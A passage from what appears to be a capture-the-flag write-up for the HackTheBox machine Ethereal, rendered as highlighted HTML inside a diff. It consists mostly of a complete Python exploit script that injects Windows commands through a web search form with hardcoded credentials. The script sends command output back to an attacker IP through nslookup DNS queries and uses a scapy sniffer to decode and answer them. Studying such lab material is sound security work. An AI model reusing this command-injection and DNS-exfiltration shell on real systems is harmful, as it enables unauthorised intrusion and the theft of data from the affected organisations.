+  <span class="mi">6</span> <span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+  <span class="mi">7</span> <span class="kn">from</span> <span class="n">cmd</span> <span class="kn">import</span> <span class="n">Cmd</span>
+  <span class="mi">8</span> <span class="kn">from</span> <span class="n">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+  <span class="mi">9</span> <span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+ <span class="mi">10</span> <span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+ <span class="mi">11</span> 
+ <span class="mi">12</span> 
+ <span class="mi">13</span> <span class="n">kill_domain</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0xdf.0xdf.</span><span class="sh">"</span>
+ <span class="mi">14</span> 
+ <span class="mi">15</span> 
+ <span class="mi">16</span> <span class="k">class</span> <span class="nc">dns_sniff</span><span class="p">(</span><span class="n">Thread</span><span class="p">):</span>
+ <span class="mi">17</span> 
+ <span class="mi">18</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">interface</span><span class="o">=</span><span class="sh">'</span><span class="s">tun0</span><span class="sh">'</span><span class="p">,</span> <span class="n">target_ip</span><span class="o">=</span><span class="sh">'</span><span class="s">10.10.10.106</span><span class="sh">'</span><span class="p">):</span>
+ <span class="mi">19</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">()</span>
+ <span class="mi">20</span>         <span class="n">self</span><span class="p">.</span><span class="n">interface</span> <span class="o">=</span> <span class="n">interface</span>
+ <span class="mi">21</span>         <span class="n">self</span><span class="p">.</span><span class="n">target_ip</span> <span class="o">=</span> <span class="n">target_ip</span>
+ <span class="mi">22</span> 
+ <span class="mi">23</span> 
+ <span class="mi">24</span>     <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">25</span>         <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Starting DNS Sniffer on </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="si">}</span><span class="s"> for target </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">target_ip</span><span class="si">}</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">26</span>         <span class="nf">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">src host </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">target_ip</span><span class="si">}</span><span class="s"> and udp port 53</span><span class="sh">"</span><span class="p">,</span>
+ <span class="mi">27</span>                 <span class="n">prn</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">parse_packet</span><span class="p">,</span> <span class="n">stop_filter</span><span class="o">=</span><span class="k">lambda</span> <span class="n">p</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span>
+ <span class="mi">28</span>                 <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="n">kill_domain</span><span class="p">)</span>
+ <span class="mi">29</span>         <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Received kill packet. Shutting down sniffer thread.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">30</span> 
+ <span class="mi">31</span> 
+ <span class="mi">32</span>     <span class="k">def</span> <span class="nf">parse_packet</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
+ <span class="mi">33</span>         <span class="k">if</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qtype</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+ <span class="mi">34</span>             <span class="n">domain</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">35</span>             <span class="k">if</span> <span class="n">domain</span> <span class="o">==</span> <span class="n">kill_domain</span><span class="p">:</span> <span class="k">return</span>
+ <span class="mi">36</span>             <span class="nf">print</span><span class="p">(</span><span class="n">domain</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">X.Q</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+ <span class="mi">37</span>             <span class="n">reply</span> <span class="o">=</span> <span class="nc">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span><span class="p">)</span><span class="o">/</span><span class="nc">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">UDP</span><span class="p">].</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="mi">53</span><span class="p">)</span><span class="o">/</span><span class="nc">DNS</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">DNS</span><span class="p">].</span><span class="nb">id</span><span class="p">,</span>
+ <span class="mi">38</span>                     <span class="n">ancount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">an</span><span class="o">=</span><span class="nc">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">p</span><span class="p">[</span><span class="n">DNSQR</span><span class="p">].</span><span class="n">qname</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">)</span><span class="o">/</span><span class="nc">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">domain</span><span class="p">,</span>
+ <span class="mi">39</span>                     <span class="n">rdata</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">))</span>
+ <span class="mi">40</span>             <span class="nf">send</span><span class="p">(</span><span class="n">reply</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="p">)</span>
+ <span class="mi">41</span> 
+ <span class="mi">42</span> <span class="k">class</span> <span class="nc">Terminal</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>
+ <span class="mi">43</span>     <span class="n">prompt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ethereal&gt; </span><span class="sh">"</span>
+ <span class="mi">44</span> 
+ <span class="mi">45</span> 
+ <span class="mi">46</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">proxy</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+ <span class="mi">47</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">()</span>
+ <span class="mi">48</span>         <span class="n">self</span><span class="p">.</span><span class="n">proxy</span> <span class="o">=</span> <span class="n">proxy</span> <span class="ow">or</span> <span class="p">{}</span>
+ <span class="mi">49</span>         <span class="n">self</span><span class="p">.</span><span class="n">auth</span> <span class="o">=</span> <span class="nc">HTTPBasicAuth</span><span class="p">(</span><span class="sh">'</span><span class="s">alan</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">!C414m17y57r1k3s4g41n!</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">50</span>         <span class="n">self</span><span class="p">.</span><span class="nf">do_login</span><span class="p">()</span>
+ <span class="mi">51</span>         <span class="n">self</span><span class="p">.</span><span class="n">fail_count</span> <span class="o">=</span> <span class="mi">0</span>
+ <span class="mi">52</span> 
+ <span class="mi">53</span> 
+ <span class="mi">54</span>     <span class="k">def</span> <span class="nf">do_login</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
+ <span class="mi">55</span>         <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Logging in and fetching state information.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">56</span>         <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">auth</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proxy</span><span class="p">)</span>
+ <span class="mi">57</span>         <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">58</span>         <span class="n">self</span><span class="p">.</span><span class="n">view_state</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATE</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">59</span>         <span class="n">self</span><span class="p">.</span><span class="n">view_state_gen</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">60</span>         <span class="n">self</span><span class="p">.</span><span class="n">event_val</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__EVENTVALIDATION</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">61</span>         <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] State information received.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">62</span> 
+ <span class="mi">63</span> 
+ <span class="mi">64</span>     <span class="k">def</span> <span class="nf">send_post</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">search</span><span class="p">):</span>
+ <span class="mi">65</span>         <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">__VIEWSTATE</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">view_state</span><span class="p">,</span>
+ <span class="mi">66</span>                 <span class="sh">'</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">view_state_gen</span><span class="p">,</span>
+ <span class="mi">67</span>                 <span class="sh">'</span><span class="s">__EVENTVALIDATION</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">event_val</span><span class="p">,</span>
+ <span class="mi">68</span>                 <span class="sh">'</span><span class="s">search</span><span class="sh">'</span><span class="p">:</span> <span class="n">search</span><span class="p">,</span>
+ <span class="mi">69</span>                 <span class="sh">'</span><span class="s">ctl02</span><span class="sh">'</span><span class="p">:</span> <span class="sh">''</span><span class="p">}</span>
+ <span class="mi">70</span>         <span class="k">try</span><span class="p">:</span>
+ <span class="mi">71</span>             <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+ <span class="mi">72</span>             <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span>
+ <span class="mi">73</span>                              <span class="n">proxies</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proxy</span><span class="p">,</span>
+ <span class="mi">74</span>                              <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span>
+ <span class="mi">75</span>                              <span class="n">auth</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">auth</span><span class="p">,</span>
+ <span class="mi">76</span>                              <span class="n">timeout</span><span class="o">=</span><span class="mi">120</span><span class="p">)</span>
+ <span class="mi">77</span>             <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span> <span class="ow">and</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">:</span>
+ <span class="mi">78</span>                 <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] Unable to connect to Ethereal</span><span class="se">\n</span><span class="s">[*] Running login</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">79</span>                 <span class="n">self</span><span class="p">.</span><span class="nf">do_login</span><span class="p">()</span>
+ <span class="mi">80</span>                 <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Try running the command again.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">81</span>         <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
+ <span class="mi">82</span>             <span class="k">pass</span>
+ <span class="mi">83</span> 
+ <span class="mi">84</span> 
+ <span class="mi">85</span>     <span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
+ <span class="mi">86</span>         <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sending kill request.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">87</span>         <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">&amp; nslookup </span><span class="si">{</span><span class="n">kill_domain</span><span class="si">}</span><span class="s"> 10.10.14.14</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">88</span>         <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+ <span class="mi">89</span> 
+ <span class="mi">90</span> 
+ <span class="mi">91</span>     <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">92</span>         <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'''</span><span class="s">&amp; (FOR /F </span><span class="sh">"</span><span class="s">tokens=1-26</span><span class="sh">"</span><span class="s"> %a IN (</span><span class="sh">'</span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="sh">'</span><span class="s">) DO ( nslookup </span><span class="sh">"</span><span class="s">Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX</span><span class="sh">"</span><span class="s"> 10.10.14.14 ))</span><span class="sh">'''</span>
+ <span class="mi">93</span>         <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+ <span class="mi">94</span> 
+ <span class="mi">95</span> 
+ <span class="mi">96</span>     <span class="k">def</span> <span class="nf">do_quiet</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">97</span>         <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">&amp; ( </span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="s"> )</span><span class="sh">'</span>
+ <span class="mi">98</span>         <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+ <span class="mi">99</span> 
+<span class="mi">100</span> 
+<span class="mi">101</span> <span class="c1">#dns = dns_sniff(interface='eth0', target_ip='10.1.1.153')
+</span><span class="mi">102</span> <span class="n">dns</span> <span class="o">=</span> <span class="nf">dns_sniff</span><span class="p">()</span>
+<span class="mi">103</span> <span class="n">dns</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+<span class="mi">104</span> 
+<span class="mi">105</span> <span class="n">term</span> <span class="o">=</span> <span class="nc">Terminal</span><span class="p">(</span><span class="n">proxy</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">})</span>
+<span class="mi">106</span> <span class="k">try</span><span class="p">:</span>
+<span class="mi">107</span>     <span class="n">term</span><span class="p">.</span><span class="nf">cmdloop</span><span class="p">()</span>
+<span class="mi">108</span> <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+<span class="mi">109</span>     <span class="n">term</span><span class="p">.</span><span class="nf">do_exit</span><span class="p">()</span>
+</code></pre></div></div>
+<div class="PageNavigation">
+<a class="prev" href="/2019/03/09/htb-ethereal-pbox.html">« Password Box Brute</a><a class="next" href="/2019/03/15/htb-ethereal-cor.html">COR Profilers »</a></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2019/03/09/htb-ethereal-shell.html"></a>
+</article>
